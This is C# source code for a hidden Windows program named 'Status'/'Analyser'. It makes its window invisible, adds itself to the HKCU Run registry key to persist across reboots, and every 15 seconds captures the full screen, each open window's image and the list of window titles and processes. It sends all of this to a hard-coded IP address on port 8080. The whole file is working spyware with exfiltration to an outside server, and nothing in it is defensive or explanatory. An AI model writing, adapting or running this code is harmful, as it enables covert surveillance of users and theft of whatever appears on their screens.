using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;

namespace Status
{
    public partial class Analyser : Form
    {
        private static readonly HttpClient _client = new HttpClient();
        private readonly string _serverUrl = "http://26.122.151.249:8080/";
        private bool _isActive;
       
        public Analyser()
        {
            InitializeComponent();

            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;

            this.Opacity = 0;
            this.ShowIcon = false;
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            AddToStartup();
            await Connect();
        }

        static void AddToStartup()
        {
            const string appName = "Status";

            try
            {
                using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    string currentPath = rk.GetValue(appName) as string;
                    string exePath = Process.GetCurrentProcess().MainModule.FileName;

                    if (currentPath == null ||
                        !currentPath.Equals(exePath, StringComparison.OrdinalIgnoreCase) ||
                        !File.Exists(currentPath))
                    {
                        rk.SetValue(appName, exePath);
                        Debug.WriteLine("Запись в автозагрузку добавлена/обновлена");
                    }
                    else
                    {
                        Debug.WriteLine("Запись уже существует и актуальна");
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Ошибка при работе с реестром: {ex.Message}");
            }
        }
        private async Task Connect()
        {
            _isActive = true;

            while (_isActive)
            {
                await Task.Delay(15000);

                try
                {
                    string pingResponse = await _client.GetStringAsync(_serverUrl);
                    Console.WriteLine($"Сервер доступен: {pingResponse}");

                    var (processInfo, images) = GetActiveWindowsInfo();

                    await Task.WhenAll(
                        SendStringToServer(processInfo),
                        SendImageToServer(CaptureScreen()),
                        SendImagesToServer(images)
                    );
                }
                catch (HttpRequestException ex)
                {
                    Console.WriteLine($"Сетевая ошибка: {ex.Message}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Ошибка: {ex.Message}");
                }
            }
        }

        private (string ProcessInfo, List<Image> Images) GetActiveWindowsInfo()
        {
            var sb = new StringBuilder();
            var images = new List<Image>();

            foreach (var process in Process.GetProcesses()
                .Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)))
            {
                sb.AppendLine($"Window: {process.MainWindowTitle}")
                  .AppendLine($"Process: {process.ProcessName}\n");

                images.Add(CaptureWindow(process));
            }

            return (sb.ToString(), images);
        }

        public Bitmap CaptureScreen()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);

            Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);

            using (Graphics g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }
            return bitmap;
        }

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);

        [DllImport("user32.dll")]
        private static extern bool PrintWindow(IntPtr hWnd, IntPtr hdcBlt, int nFlags);

        [StructLayout(LayoutKind.Sequential)]
        private struct Rect
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        public static Bitmap CaptureWindow(Process process)
        {
            var hwnd = process.MainWindowHandle;
            if (hwnd == IntPtr.Zero)
                return null;

            Rect rect = new Rect();
            GetWindowRect(hwnd, ref rect);

            int width = rect.Right - rect.Left;
            int height = rect.Bottom - rect.Top;

            if (width <= 0 || height <= 0)
                return null;

            Bitmap bmp = new Bitmap(width, height, PixelFormat.Format32bppArgb);
            Graphics gfxBmp = Graphics.FromImage(bmp);
            IntPtr hdcBitmap = gfxBmp.GetHdc();

            PrintWindow(hwnd, hdcBitmap, 2);

            gfxBmp.ReleaseHdc(hdcBitmap);
            gfxBmp.Dispose();

            return bmp;
        }
        private async Task SendImageToServer(Bitmap image)
        {
            try
            {
                byte[] imageData;
                using (var ms = new MemoryStream())
                {
                    image.Save(ms, ImageFormat.Png);
                    imageData = ms.ToArray();
                }

                var content = new ByteArrayContent(imageData);
                content.Headers.ContentType = new MediaTypeHeaderValue("image/png");

                HttpResponseMessage response = await _client.PostAsync(_serverUrl, content);

                if (response.IsSuccessStatusCode)
                {
                    string responseText = await response.Content.ReadAsStringAsync();
                    Console.WriteLine($"Сервер ответил: {responseText}");
                }
                else
                {
                    Console.WriteLine($"Ошибка: {response.StatusCode}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка отправки: {ex.Message}");
            }
        }
        private async Task SendImagesToServer(List<Image> images)
        {
            try
            {
                using (var multipartContent = new MultipartFormDataContent())
                {
                    for (int i = 0; i < images.Count; i++)
                    {
                        using (var ms = new MemoryStream())
                        {
                            images[i].Save(ms, ImageFormat.Png);
                            var imageContent = new ByteArrayContent(ms.ToArray());
                            imageContent.Headers.ContentType = new MediaTypeHeaderValue("images/png");

                            multipartContent.Add(imageContent, $"image{i}", $"window_{i}.png");
                        }
                    }

                    var response = await _client.PostAsync(_serverUrl, multipartContent);
                    response.EnsureSuccessStatusCode();

                    if (response.IsSuccessStatusCode)
                    {
                        string responseText = await response.Content.ReadAsStringAsync();
                        Console.WriteLine($"Сервер ответил: {responseText}");
                    }
                    else
                    {
                        Console.WriteLine($"Ошибка: {response.StatusCode}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка отправки: {ex.Message}");
            }
        }
        private async Task SendStringToServer(string message)
        {
            try
            {
                var content = new StringContent(message, Encoding.UTF8, "text/plain");

                HttpResponseMessage response = await _client.PostAsync(_serverUrl, content);

                if (response.IsSuccessStatusCode)
                {
                    string responseText = await response.Content.ReadAsStringAsync();
                    Console.WriteLine($"Сервер ответил: {responseText}");
                }
                else
                {
                    Console.WriteLine($"Ошибка: {response.StatusCode}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка отправки: {ex.Message}");
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            _isActive = false;
            _client.Dispose();
        }
    }
}
